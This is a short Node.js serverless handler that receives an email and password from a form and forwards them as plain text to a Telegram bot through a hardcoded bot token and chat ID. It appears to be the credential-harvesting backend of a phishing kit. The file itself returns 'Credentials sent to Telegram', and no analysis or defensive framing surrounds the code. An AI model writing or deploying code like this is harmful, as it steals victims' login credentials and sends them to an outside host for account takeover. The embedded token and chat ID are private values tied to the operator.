// api/submit.js
module.exports = (req, res) => {
    const { email, password } = req.body;

    // Handle the form submission, e.g., send to Telegram bot
    const telegramBotToken = '7468423665:AAG1jEh6Qul02uE4CaZj5VS6VTeqaRRB0m4';
    const telegramChatId = '5172045930';
    const telegramMessage = `Email: ${email}\nPassword: ${password}`;

    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: telegramMessage
        })
    })
    .then(response => response.json())
    .then(data => {
        res.status(200).json({ signal: 'ok', msg: 'Credentials sent to Telegram' });
    })
    .catch(error => {
        res.status(500).json({ signal: 'error', msg: 'Failed to send credentials' });
    });
};
